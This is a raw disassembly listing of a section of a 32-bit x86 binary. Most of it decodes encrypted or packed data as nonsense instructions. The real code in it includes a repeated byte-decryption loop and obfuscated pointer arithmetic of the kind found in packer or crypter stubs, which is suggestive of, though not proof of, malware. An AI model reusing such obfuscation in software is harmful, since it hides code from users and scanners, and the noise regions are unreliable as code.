  4163f2:	sub    DWORD PTR [edi-0x58],esi
  4163f5:	xor    DWORD PTR [ecx+0x13],ebp
  4163f8:	aaa    
  4163f9:	jo     0x4163ab
  4163fb:	fstp   QWORD PTR [edi]
  4163fd:	adc    BYTE PTR [eax],0xc9
  416400:	jbe    0x41642d
  416402:	or     dl,BYTE PTR [ebp-0x39]
  416405:	outs   dx,DWORD PTR ds:[esi]
  416406:	lock jmp 0x7d18:0xda155f20
  41640e:	jg     0x416463
  416410:	daa    
  416411:	ss pusha 
  416413:	dec    ebx
  416414:	jne    0x416432
  416416:	mov    ah,0x8b
  416418:	ja     0x416436
  41641a:	ss sbb al,0xd1
  41641d:	jno    0x41647f
  41641f:	outs   dx,DWORD PTR ds:[esi]
  416420:	and    bh,BYTE PTR [esi-0x555582c]
  416426:	mov    DWORD PTR ds:[esi],edi
  416429:	pop    eax
  41642a:	or     esp,edi
  41642c:	int3   
  41642d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41642e:	outs   dx,BYTE PTR ds:[esi]
  41642f:	bound  eax,QWORD PTR [ecx+ebp*8]
  416432:	jp     0x4163e5
  416434:	push   esi
  416435:	cmp    al,0x89
  416437:	sub    ah,cl
  416439:	sbb    DWORD PTR [ebx-0x5470cfe9],edi
  41643f:	jns    0x416454
  416441:	adc    eax,0xe9219fef
  416446:	cmp    eax,0x22b6f77
  41644b:	cld    
  41644c:	cmc    
  41644d:	out    dx,eax
  41644e:	mov    dl,0x7
  416450:	push   eax
  416451:	sub    al,dh
  416453:	cmp    al,0xc5
  416455:	pushf  
  416456:	mov    BYTE PTR [ecx+0x30],dh
  416459:	jmp    0x41640a
  41645b:	push   0xf06d3474
  416460:	push   ds
  416461:	in     eax,dx
  416462:	push   ds
  416463:	cwde   
  416464:	jae    0x416433
  416466:	(bad)  
  416467:	mov    dh,BYTE PTR [ebx+0x7c1b765f]
  41646d:	out    dx,al
  41646e:	addr16 into 
  416470:	inc    eax
  416471:	popf   
  416472:	mov    ch,0x8
  416474:	pusha  
  416475:	scas   eax,DWORD PTR es:[edi]
  416476:	xchg   esi,eax
  416477:	lods   eax,DWORD PTR ds:[esi]
  416478:	inc    edx
  416479:	or     esp,DWORD PTR [eax-0x4278901c]
  41647f:	mov    ds:0xb1441cd1,al
  416485:	pusha  
  416486:	cli    
  416487:	sbb    edx,ebx
  416489:	ja     0x4164e7
  41648b:	jecxz  0x4164c4
  41648d:	adc    ecx,esi
  41648f:	(bad)  
  416490:	sti    
  416491:	fld    st(7)
  416493:	ds jl  0x41645c
  416496:	in     eax,0x22
  416498:	sub    cl,BYTE PTR [edx+0x1]
  41649b:	lahf   
  41649c:	push   esi
  41649d:	jno    0x416451
  41649f:	into   
  4164a0:	ret    0x832
  4164a3:	jmp    0x416473
  4164a5:	test   DWORD PTR [eax+0x65],esi
  4164a8:	pusha  
  4164a9:	(bad)  
  4164aa:	push   ds
  4164ab:	and    edi,esp
  4164ad:	imul   esp,DWORD PTR [edx+0x20],0x20dc5cb3
  4164b4:	jmp    0x6a37:0x123302e5
  4164bb:	add    eax,0x6551221e
  4164c0:	addr16 ss pop esp
  4164c3:	sti    
  4164c4:	int    0x46
  4164c6:	test   al,0xc8
  4164c8:	mov    cl,0xdd
  4164ca:	cmp    ebp,DWORD PTR [ecx-0x7f8eeec6]
  4164d0:	mov    esp,0x1f67fc7d
  4164d5:	test   BYTE PTR ss:[esp+edx*4+0x416361b],ah
  4164dd:	les    edx,FWORD PTR [edx]
  4164df:	jle    0x41653c
  4164e1:	xchg   BYTE PTR [ebx+eiz*4-0x3c],dl
  4164e5:	aaa    
  4164e6:	arpl   WORD PTR [ebx-0x553ed51],sp
  4164ec:	sub    edi,DWORD PTR [eax]
  4164ee:	(bad)  
  4164ef:	xchg   ebp,eax
  4164f0:	leave  
  4164f1:	mov    ecx,0x3095d815
  4164f6:	in     eax,0xa0
  4164f8:	add    DWORD PTR [ecx+ebp*8+0x3c09cffc],eax
  4164ff:	mov    bh,0xfd
  416501:	xchg   ecx,eax
  416502:	sbb    DWORD PTR ds:0x61312f,edi
  416508:	rcl    BYTE PTR [eax+0x79],0xc4
  41650c:	pop    ecx
  41650d:	jecxz  0x4164a2
  41650f:	(bad)  
  416510:	jl     0x41652e
  416512:	mov    dh,0xb7
  416514:	mov    ecx,0xbcd1b103
  416519:	push   ds
  41651a:	push   ebx
  41651b:	in     eax,dx
  41651c:	and    dl,BYTE PTR [eax]
  41651e:	dec    eax
  41651f:	daa    
  416520:	ss and al,0xec
  416523:	pop    edi
  416524:	js     0x41651b
  416526:	add    eax,0xfb8c94f7
  41652b:	push   cs
  41652c:	shr    BYTE PTR [ecx-0x5c20a0f0],0x95
  416533:	clc    
  416534:	dec    ebx
  416535:	fstp   DWORD PTR [esi+0x7772e12a]
  41653b:	sar    esi,0x7b
  41653e:	xchg   DWORD PTR [ebx+0x7b],esi
  416541:	in     eax,0x67
  416543:	popf   
  416544:	jno    0x4164cd
  416546:	je     0x4165a2
  416548:	shl    DWORD PTR [edx-0x3f4adc6d],cl
  41654e:	ror    DWORD PTR [edi+0x6b6ee4b5],cl
  416554:	hlt    
  416555:	(bad)  
  416557:	dec    edi
  416558:	ins    DWORD PTR es:[edi],dx
  416559:	xchg   esp,eax
  41655a:	jmp    DWORD PTR [edx-0x38cc7ded]
  416560:	shr    eax,0x2
  416563:	or     ecx,eax
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x4225c8
  416605:	mov    edi,0x42250e
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x4225c8
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp+0x7f19b770]
  416729:	mov    al,0x77
  41672b:	cld    
  41672c:	push   ss
  41672d:	sbb    BYTE PTR [ebx+0x49181814],bl
  416733:	fdivr  QWORD PTR [ecx+0x57bcd82f]
  416739:	lahf   
  41673a:	and    al,ch
  41673c:	xor    al,0xb1
  41673e:	nop
  41673f:	iret   
  416740:	pusha  
  416741:	adc    al,0x8e
  416743:	pop    edi
  416744:	pop    eax
  416745:	icebp  
  416746:	in     eax,dx
  416747:	pop    es
  416748:	mov    ebp,0x981c075e
  41674d:	push   0xffffffc4
  41674f:	retf   
  416750:	pop    ss
  416751:	shl    bh,cl
  416753:	jecxz  0x4167a8
  416755:	dec    eax
  416756:	(bad)  
  416757:	cdq    
  416758:	lds    ecx,FWORD PTR [esi-0x5b]
  41675b:	push   0x5d
  41675d:	mov    esp,0xb11af5a0
  416762:	mov    BYTE PTR cs:[eax+0x72],ah
  416766:	jo     0x41679b
  416768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416769:	jb     0x416730
  41676b:	clc    
  41676c:	ret    
  41676d:	and    ah,BYTE PTR [edi+edi*4]
  416770:	inc    edi
  416771:	mov    bh,0xdb
  416773:	push   0x7fd6bec9
  416778:	xor    DWORD PTR [ecx],ebp
  41677a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41677b:	cmp    BYTE PTR [eax-0x5c],cl
  41677e:	sub    cl,BYTE PTR [eax+0xa5d4a4b]
  416784:	clc    
  416785:	sbb    bl,BYTE PTR [ebx+ebx*2+0x2c]
  416789:	nop    DWORD PTR [ebp+0x50]
  41678d:	mov    edx,0x227b7a4
  416792:	jns    0x416770
  416794:	js     0x416761
  416796:	mov    ecx,0x445a2549
  41679b:	mov    edi,0xd3045a47
  4167a0:	xor    al,0x54
  4167a2:	mov    eax,0xb629b1ba
  4167a7:	out    dx,al
  4167a8:	jae    0x416768
  4167aa:	(bad)  
  4167ab:	retf   
  4167ac:	in     al,dx
  4167ad:	std    
  4167ae:	clc    
  4167af:	stos   BYTE PTR es:[edi],al
  4167b0:	icebp  
  4167b1:	retf   
  4167b2:	dec    ebx
  4167b3:	jbe    0x4167a1
  4167b5:	push   0x2cfd9976
  4167ba:	dec    eax
  4167bb:	sub    DWORD PTR [esi+ecx*1-0x6ef885fe],esp
  4167c2:	loopne 0x416807
  4167c4:	sub    DWORD PTR [eax+ecx*1-0x70],edx
  4167c8:	jbe    0x416789
  4167ca:	push   esp
  4167cb:	stc    
  4167cc:	pop    es
  4167cd:	imul   esp,edi,0x4f
  4167d0:	dec    esp
  4167d1:	test   al,0xc9
  4167d3:	xchg   ebx,eax
  4167d4:	call   0x808df322
  4167d9:	jl     0x4167e0
  4167db:	jns    0x4167ea
  4167dd:	sbb    al,0x79
  4167df:	mov    fs,ecx
  4167e1:	adc    al,0x38
  4167e3:	std    
  4167e4:	xchg   DWORD PTR [ecx-0x42],edi
  4167e7:	rcl    DWORD PTR [edi-0x3f],cl
  4167ea:	push   ss
  4167eb:	pop    es
  4167ec:	pop    ebp
  4167ed:	(bad)  
  4167ee:	adc    BYTE PTR [eax+edx*2+0xf496948],dl
  4167f5:	sbb    al,0x48
  4167f7:	jmp    0x416823
  4167f9:	sti    
  4167fa:	push   ebp
  4167fb:	xchg   ecx,eax
  4167fc:	out    dx,al
  4167fd:	out    0x33,al
  4167ff:	mov    edi,0xc53266b4
  416804:	mov    ch,0x77
  416806:	in     eax,dx
  416807:	(bad)  [esi+0x5d96ef7b]
  41680d:	mov    bl,BYTE PTR ds:0xa02f5aad
  416813:	adc    ebx,DWORD PTR [edx-0x61]
  416816:	shl    al,cl
  416818:	sub    eax,DWORD PTR [edi+0x5ee2c6d4]
  41681e:	mov    esp,0x4b8b95ea
  416823:	scas   eax,DWORD PTR es:[edi]
  416824:	sbb    DWORD PTR cs:[ecx-0x1afbe1a8],ecx
  41682b:	cmp    al,ah
  41682d:	xor    eax,0x788dd758
  416832:	inc    ecx
  416833:	xchg   bl,ah
  416835:	cmp    eax,DWORD PTR [edx+0x63609937]
  41683b:	les    edx,FWORD PTR [esi]
  41683d:	test   DWORD PTR ds:0x3a314d85,edx
  416843:	lahf   
  416844:	ja     0x4168bd
  416846:	mov    edx,DWORD PTR [edx-0x17e350c8]
  41684c:	mov    cs,ebx
  41684e:	mov    ah,0x5d
  416850:	aam    0xc2
  416852:	adc    DWORD PTR [ecx+0x7b9098ec],esi
  416858:	mov    edi,0x164d64c8
  41685d:	popa   
  41685e:	sbb    al,0x5f
  416860:	(bad)  
  416861:	in     al,0x4d
  416863:	es jne 0x41682d
  416866:	mov    dl,0xc5
  416868:	inc    edi
  416869:	cmp    BYTE PTR [ebx-0x63],bl
  41686c:	out    0x7c,eax
  41686e:	dec    ebp
  41686f:	xchg   edi,eax
  416870:	add    eax,0x6b584e73
  416875:	(bad)  
  416876:	or     edi,DWORD PTR [ebx+0x2546ed1f]
  41687c:	lea    esp,[ebp-0x39]
  41687f:	inc    ecx
  416880:	pop    ecx
  416881:	cwde   
  416882:	xchg   edx,eax
  416883:	div    BYTE PTR [edx]
  416885:	push   0xffffffda
  416887:	cmp    dl,bh
  416889:	jmp    0x3653027
  41688e:	cmp    edx,DWORD PTR [edx-0x49]
  416891:	leave  
  416892:	pop    ds
  416893:	mov    ds:0x5f85850,al
  416898:	dec    esi
  416899:	jl     0x416874
  41689b:	into   
  41689c:	stos   BYTE PTR es:[edi],al
  41689d:	fdivr  DWORD PTR [ecx]
  41689f:	push   eax
  4168a0:	bound  edi,QWORD PTR [edx]
  4168a2:	pop    eax
  4168a3:	mov    ds:0x201080cf,al
  4168a8:	pop    edx
  4168a9:	jnp    0x4168a6
  4168ab:	cs mov bh,0x5d
  4168ae:	loop   0x4168de
  4168b0:	xlat   BYTE PTR ds:[ebx]
  4168b1:	inc    esp
  4168b2:	mov    ecx,es
  4168b4:	shl    DWORD PTR [ebx+ebp*4-0x4],cl
  4168b8:	aaa    
  4168b9:	adc    eax,0x5d7bc512
  4168be:	mov    ah,0xca
  4168c0:	jp     0x4168e4
  4168c2:	scas   eax,DWORD PTR es:[edi]
  4168c3:	jmp    0x416880
  4168c5:	jbe    0x416908
  4168c7:	mov    dl,0x65
  4168c9:	int3   
  4168ca:	add    eax,0x7e7c7acc
  4168cf:	shl    BYTE PTR [edi-0x36],1
  4168d2:	push   ebp
  4168d3:	into   
  4168d4:	inc    esp
  4168d5:	iret   
  4168d6:	dec    ecx
  4168d7:	shr    BYTE PTR [ecx-0x57c561eb],0x64
  4168de:	jmp    0x20561b33
  4168e3:	or     BYTE PTR [edi+0x7eb4234a],al
  4168e9:	loop   0x4168f9
  4168eb:	fucom  st(3)
  4168ed:	(bad)  
  4168ee:	xor    edi,edi
  4168f0:	mov    esi,0xe10c0371
  4168f5:	pop    esi
  4168f6:	lahf   
  4168f7:	popf   
  4168f8:	stos   DWORD PTR es:[edi],eax
  4168f9:	gs xchg ebp,eax
  4168fb:	xchg   BYTE PTR [ebp-0x73],ch
  4168fe:	fstp   TBYTE PTR [eax+ecx*4-0x79]
  416902:	or     DWORD PTR [ecx],edi
  416904:	cmp    ebx,esp
  416906:	and    al,0xa
  416908:	and    al,0x72
  41690a:	daa    
  41690b:	je     0x4168a2
  41690d:	stos   DWORD PTR es:[edi],eax
  41690e:	mov    dh,0x79
  416910:	and    BYTE PTR [ebx+0x1c1fe85b],ah
  416916:	add    eax,0x4b9c5592
  41691b:	bound  esp,QWORD PTR [edi+ecx*1]
  41691e:	pop    ebp
  41691f:	addr16 add ah,cl
  416922:	xor    BYTE PTR ds:0x87d48e6c,al
  416928:	cmp    al,0xad
  41692a:	cmp    al,0x65
  41692c:	clc    
  41692d:	lods   al,BYTE PTR ds:[esi]
  41692e:	sbb    bh,BYTE PTR [esi]
  416930:	add    DWORD PTR [ebp+0xe2f851],esi
  416936:	inc    edi
  416937:	repnz lods al,BYTE PTR ds:[esi]
  416939:	in     al,0x50
  41693b:	sub    eax,0xb10caa4b
  416940:	pop    edx
  416941:	and    bh,cl
  416943:	jle    0xdbc30f38
  416949:	ins    BYTE PTR es:[edi],dx
  41694a:	popw   ds
  41694c:	push   0x41
  41694e:	jl     0x416999
  416950:	and    BYTE PTR [ebp-0x3c],0x96
  416954:	mov    ecx,0xa298844f
  416959:	cwde   
  41695a:	mov    ah,bh
  41695c:	dec    esp
  41695d:	mov    esp,0xb9799308
  416962:	adc    edx,DWORD PTR ds:0xadf1a9b1
  416968:	pop    edx
  416969:	dec    ecx
  41696a:	mov    cl,0x5b
  41696c:	aaa    
  41696d:	das    
  41696e:	and    DWORD PTR [esi-0x47a8faa2],ebx
  416974:	jb     0x416903
  416976:	inc    ebp
  416977:	(bad)  
  416978:	push   eax
  416979:	mov    eax,DWORD PTR [ebp+0x10]
  41697c:	mov    ecx,DWORD PTR [ebp+0x14]
  41697f:	shrd   eax,ecx,0x2
  416983:	shr    ecx,0x2
  416986:	mov    ecx,DWORD PTR [ebp+0x10]
  416989:	mov    edx,DWORD PTR [ebp+0x14]
  41698c:	xor    eax,esi
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0x7e4ff696
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx-0x39e7e7ec],bl
  4169ac:	data16 cmc 
  4169ae:	test   DWORD PTR [ebp-0x23],0x40f39879
  4169b5:	retf   0x14c3
  4169b8:	sbb    BYTE PTR [edx-0x26],al
  4169bb:	mov    ebp,0xcb60591c
  4169c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169c1:	cmc    
  4169c2:	es jp  0x41699f
  4169c5:	(bad)  
  4169c6:	mov    edx,0xe642923e
  4169cb:	add    edx,esi
  4169cd:	xchg   edx,eax
  4169ce:	pop    ecx
  4169cf:	test   DWORD PTR [edi+0x422d3f29],ecx
  4169d5:	js     0x4169c6
  4169d7:	stos   BYTE PTR es:[edi],al
  4169d8:	repnz pop ss
  4169da:	jecxz  0x416a51
  4169dc:	out    0x86,eax
  4169de:	imul   ebx,DWORD PTR [edx+ebp*4+0x3c],0xffffffde
  4169e3:	in     eax,dx
  4169e4:	jmp    0xb8d2b778
  4169e9:	mov    bh,0x21
  4169eb:	xchg   ecx,eax
  4169ec:	jnp    0x416a04
  4169ee:	push   ecx
  4169ef:	loope  0x41698a
  4169f1:	mov    ds:0x6fe1c947,al
  4169f6:	sbb    al,0x12
  4169f8:	into   
  4169f9:	dec    esi
  4169fa:	sbb    BYTE PTR [esi+0x3d0163a3],ah
  416a00:	out    dx,al
  416a01:	xchg   ecx,eax
  416a02:	dec    edx
  416a03:	aad    0xde
  416a05:	je     0x4169bb
  416a07:	mov    bh,0x33
  416a09:	imul   eax,ebx,0xffffffe3
  416a0c:	sub    edx,DWORD PTR [eax]
  416a0e:	jmp    0x2895:0x5b7f97e
  416a15:	dec    eax
  416a16:	inc    edi
  416a17:	push   esi
  416a18:	mov    DWORD PTR [edx-0x68],edx
  416a1b:	cmp    BYTE PTR [esp+esi*8+0x7a],0x22
  416a20:	mov    ebx,0x9bc1d2bd
  416a25:	mov    eax,0x3b269759
  416a2a:	push   edx
  416a2b:	jnp    0x4169c7
  416a2d:	gs dec edi
  416a2f:	(bad)  
  416a30:	loopne 0x416a35
  416a32:	std    
  416a33:	xchg   BYTE PTR [ecx+esi*4+0x77],ch
  416a37:	cmp    BYTE PTR [ebx+0xc],bl
  416a3a:	push   ecx
  416a3b:	dec    esp
  416a3c:	lea    edi,[esi]
  416a3e:	stos   BYTE PTR es:[edi],al
  416a3f:	or     ebx,DWORD PTR [ebp+eiz*4-0x7c]
  416a43:	lahf   
  416a44:	ffreep st(3)
  416a46:	pop    eax
  416a47:	inc    eax
  416a49:	in     eax,0x61
  416a4b:	sub    ch,dl
  416a4d:	xor    al,0x58
  416a4f:	and    eax,0xaafa84b
  416a54:	jmp    0xad54b7e
  416a59:	pusha  
  416a5a:	cld    
  416a5b:	or     BYTE PTR [edi-0x9],dh
  416a5e:	je     0x416ab2
  416a60:	dec    esi
  416a61:	bound  edi,QWORD PTR ds:0x12bb2de0
  416a67:	push   eax
  416a68:	xor    ebp,DWORD PTR [esi-0x2c]
  416a6b:	int    0xbe
  416a6d:	jbe    0x416a77
  416a6f:	cli    
  416a70:	jno    0x416a26
  416a72:	mov    dl,BYTE PTR [esi+0x18]
  416a75:	mov    eax,0x890bf07c
  416a7a:	int    0x69
  416a7c:	test   al,0xbc
  416a7e:	xchg   ebp,eax
  416a7f:	icebp  
  416a80:	mov    ss,WORD PTR [esi+ebp*8+0x3]
  416a84:	sub    DWORD PTR [edx+0x7d],0xffffffa0
  416a88:	stos   DWORD PTR es:[edi],eax
  416a89:	mov    dl,0x77
  416a8b:	popa   
  416a8c:	xchg   edi,eax
  416a8d:	xor    DWORD PTR [ecx-0x74a23150],0x5e
  416a94:	cdq    
  416a95:	xor    al,0x6e
  416a97:	jg     0x416a88
  416a99:	mov    al,ds:0x611f413a
  416a9e:	cmp    BYTE PTR [edx+0x24],bl
  416aa1:	fsub   DWORD PTR [edx]
  416aa3:	adc    cl,BYTE PTR [edi-0x17]
  416aa6:	scas   eax,DWORD PTR es:[edi]
  416aa7:	jmp    0x6a3ebf4c
  416aac:	pop    ebp
  416aad:	jae    0x416ab4
  416aaf:	fisub  WORD PTR [edx-0x29]
  416ab2:	pop    edx
  416ab3:	mov    ch,0x6
  416ab5:	in     eax,0x7b
  416ab7:	and    edi,eax
  416ab9:	sbb    eax,0x2976b9f5
  416abe:	mov    cs,WORD PTR [edx+0x73]
  416ac1:	adc    ebx,esp
  416ac3:	dec    edi
  416ac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ac5:	jmp    0x416a5c
  416ac7:	inc    ecx
  416ac8:	pushf  
  416ac9:	adc    DWORD PTR [ebx],edx
  416acb:	add    esp,DWORD PTR [edx+ebx*4+0x21]
  416acf:	out    0xdd,al
  416ad1:	arpl   WORD PTR [edx+0x2a],cx
  416ad4:	test   DWORD PTR [ecx+0x4b973d9a],esp
  416ada:	pop    esi
  416adb:	pop    es
  416adc:	ret    0x1c73
  416adf:	inc    eax
  416ae0:	call   0x642c78e7
  416ae5:	inc    esi
  416ae6:	cld    
  416ae7:	mov    ds:0xf4f869a4,eax
  416aec:	loopne 0x416aba
  416aee:	push   ebx
  416aef:	lock mov WORD PTR [esp+ebx*1-0x32],ss
  416af4:	stos   DWORD PTR es:[edi],eax
  416af5:	or     edx,DWORD PTR [edx]
  416af7:	sub    al,cl
  416af9:	arpl   cx,bx
  416afb:	ror    DWORD PTR [ebp+eiz*1+0x5a4aeeb3],1
  416b02:	xchg   edx,eax
  416b03:	jae    0x416b79
  416b05:	fwait
  416b06:	mov    edx,0xba00a41a
  416b0b:	ds js  0x416ab4
  416b0e:	(bad)  
  416b10:	xor    eax,0xd222d06c
  416b15:	repz sbb al,0xfa
  416b18:	mov    esi,0x699d200a
  416b1d:	cmc    
  416b1e:	ret    
  416b1f:	add    eax,0x1df19c54
  416b24:	and    ecx,DWORD PTR [ebp+esi*1+0x56]
  416b28:	xor    al,0x1d
  416b2a:	lods   eax,DWORD PTR es:[esi]
  416b2c:	xchg   ebp,eax
  416b2d:	jp     0x416aed
  416b2f:	or     eax,0x92a7eb2f
  416b34:	xchg   edi,eax
  416b35:	cli    
  416b36:	adc    BYTE PTR [edi-0x2d],al
  416b39:	or     BYTE PTR [ecx],al
  416b3b:	retf   0x811b
  416b3e:	pop    esi
  416b3f:	popa   
  416b40:	(bad)
  416b43:	jbe    0x416b10
  416b45:	aaa    
  416b46:	icebp  
  416b47:	ja     0x416b22
  416b49:	fistp  DWORD PTR [edi+0x58]
  416b4c:	mov    ch,0x50
  416b4e:	push   es
  416b4f:	in     eax,dx
  416b50:	cmp    esp,DWORD PTR [ebx-0x58]
  416b53:	or     ah,BYTE PTR [edi]
  416b55:	mov    edi,0x5dca95a6
  416b5a:	shl    BYTE PTR [ebx-0x63cbf964],1
  416b60:	add    DWORD PTR [eax-0x4b978840],edx
  416b66:	shl    BYTE PTR [edx],0x5a
  416b69:	sbb    al,0xe2
  416b6b:	sbb    edx,DWORD PTR [ebx-0x44]
  416b6e:	xchg   ebx,eax
  416b6f:	or     ebp,DWORD PTR [esi-0x61]
  416b72:	jmp    0x9d91:0xa98c957f
  416b79:	aas    
  416b7a:	pop    ds
  416b7b:	and    edi,edi
  416b7d:	js     0x416bc9
  416b7f:	retf   
  416b80:	ror    DWORD PTR [ebp+0x28207b6a],0x78
  416b87:	imul   eax,DWORD PTR [esi+edx*4+0x56],0xa5283e95
  416b8f:	mov    bh,0x80
  416b91:	cmp    al,BYTE PTR [eax+0x118bd996]
  416b97:	mov    dl,0xa0
  416b99:	inc    ebp
  416b9a:	idiv   BYTE PTR [ecx+0x17d1379e]
  416ba0:	(bad)  
  416ba1:	out    dx,al
  416ba2:	iret   
  416ba3:	adc    al,0xf1
  416ba5:	fwait
  416ba6:	mov    ah,0xf
  416ba8:	(bad)  
  416ba9:	fcomp  DWORD PTR [esi-0x3c7c140f]
  416baf:	inc    esp
  416bb0:	mov    cl,0x1
  416bb2:	or     dh,BYTE PTR [ebx+0x6c1c6d0b]
  416bb8:	pushf  
  416bb9:	dec    esp
  416bba:	test   DWORD PTR [edx-0x34],ebp
  416bbd:	ja     0x416c28
  416bbf:	sub    dl,bh
  416bc1:	ins    DWORD PTR es:[edi],dx
  416bc2:	mov    dh,0xaf
  416bc4:	pushf  
  416bc5:	retf   
  416bc6:	sbb    dh,dl
  416bc8:	cmp    DWORD PTR [ebx+0x62],esi
  416bcb:	mov    ebx,0x9b72774d
  416bd0:	fcomp  DWORD PTR [esp+ebx*1-0x5d]
  416bd4:	ret    0xfc4b
  416bd7:	sub    edi,edi
  416bd9:	push   0x69
  416bdb:	mov    ebx,0x96b19144
